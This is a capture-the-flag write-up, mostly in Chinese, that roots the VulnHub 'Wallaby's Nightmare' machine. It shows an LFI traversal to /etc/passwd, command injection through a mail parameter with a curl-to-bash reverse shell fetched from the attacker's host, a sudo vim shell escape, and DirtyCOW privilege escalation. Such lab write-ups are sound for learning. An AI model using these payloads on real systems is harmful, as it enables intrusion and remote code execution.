# Wallaby's: Nightmare (v1.0.2)

2024-8-10 https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/

difficulty: begginer-intermediate

## IP

192.168.10.199

## Scan

Open Port -> 22,6667,60080

```
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6e07fc702098f846e48d2eca3922c7be (RSA)
|   256 994605e7c2bace06c447c84f9f584c86 (ECDSA)
|_  256 4c87714faf1b7c3549ba5826c1dfb84f (ED25519)
6667/tcp  filtered irc
60080/tcp open     http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Wallaby's Server
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

先访问 80， 页面底部的 start ctf 存在文件包含， http://192.168.10.199:60080/?page=../../../../../../etc/passwd:

```
root:x:0:0:root:/root:/bin/bash
...
steven?:x:1001:1001::/home/steven?:/bin/bash
ircd:x:1003:1003:,,,:/home/ircd:/bin/bash
```

只发现了 page 这里的一个参数，再次尝试对 page 参数进行 FUZZ:

```
ffuf -c -w /usr/share/dirb/wordlists/big.txt -u http://192.168.10.199:60080/?page=FUZZ -fs 899

blacklist               [Status: 200, Size: 994, Words: 202, Lines: 28, Duration: 5ms]
cgi-bin/                [Status: 200, Size: 900, Words: 181, Lines: 28, Duration: 8ms]
contact                 [Status: 200, Size: 895, Words: 182, Lines: 27, Duration: 3ms]
contact us              [Status: 200, Size: 895, Words: 182, Lines: 27, Duration: 4ms]
home page               [Status: 200, Size: 1147, Words: 220, Lines: 31, Duration: 3ms]
home                    [Status: 200, Size: 1147, Words: 220, Lines: 31, Duration: 4ms]
index                   [Status: 200, Size: 1362, Words: 279, Lines: 39, Duration: 4ms]
mailer                  [Status: 200, Size: 1085, Words: 204, Lines: 30, Duration: 1ms]
```

逐个访问这几个单词，并查看源码，发现:

```
http://192.168.10.199:60080/?page=mailer

<!--a href='/?page=mailer&mail=mail wallaby "message goes here"'><button type='button'>Sendmail</button-->
```

发现 mail 参数处可能存在命令执行，`http://192.168.10.199:60080/?page=mailer&mail=ls` 可以看到目录中的文件。

通过执行反弹 shell 得到 `http://192.168.10.199:60080/?page=mailer&mail=curl%20http://192.168.10.3/10.3/8888.sh|bash`

sudo -l 发现:

```
(waldo) NOPASSWD: /usr/bin/vim /etc/apache2/sites-available/000-default.conf
(ALL) NOPASSWD: /sbin/iptables
```

```
sudo /sbin/iptables -L

target     prot opt source               destination
ACCEPT     tcp  --  localhost            anywhere             tcp dpt:ircd
DROP       tcp  --  anywhere             anywhere             tcp dpt:ircd
```

将防火墙中的规则清空，放开 6667 端口: sudo iptables -D INPUT 2 , 这时再次扫描，就能看到 6667/tcp open irc UnrealIRCd 的 IRC 服务。

经过枚举，发现 wallaby 用户中有一个 run.py 文件:

```
www-data@ubuntu:/home/wallaby/.sopel/modules$ cat run.py
import sopel.module, subprocess, os
from sopel.module import example

@sopel.module.commands('run')
@example('.run ls')
def run(bot, trigger):
     if trigger.owner:
          os.system('%s' % trigger.group(2))
          runas1 = subprocess.Popen('%s' % trigger.group(2), stdout=subprocess.PIPE).communicate()[0]
          runas = str(runas1)
          bot.say(' '.join(runas.split('\\n')))
     else:
          bot.say('Hold on, you aren\'t Waldo?')

```

使用此命令切换到 waldo 用户：

```
sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf
:!sh
```

发现在重启后，waldo 用户会执行下面的命令:

```
@reboot /home/waldo/irssi.sh

$ cat irssi.sh
#!/bin/bash
tmux new-session -d -s irssi
tmux send-keys -t irssi 'n' Enter
tmux send-keys -t irssi 'irssi' Enter
```

表示在 tmux 中启动 irssi 会话。

这里在 kali 上没找到简单的进入 irc 会话的程序，后面的就没有继续尝试。查询相关 wp 后，了解了大概的利用思路：关闭 waldo 的 tmux 会话，进入到 irc 聊天服务中，冒充 Waldo 用户，就可以执行命令进行反弹，得到 wallaby 的会话，sudo -l 是全部功能，就可以提权到 root。

得到了 www-data 的 webshell，使用 40616.cow.c 的脏牛可以提权，上传源码，gcc 编译后执行，得到了 root 权限:

```
root@ubuntu:/root# cat flag.txt
###CONGRATULATIONS###

You beat part 1 of 2 in the "Wallaby's Worst Knightmare" series of vms!!!!

This was my first vulnerable machine/CTF ever!  I hope you guys enjoyed playing it as much as I enjoyed making it!

Come to IRC and contact me if you find any errors or interesting ways to root, I'd love to hear about it.

Thanks guys!
-Waldo
```
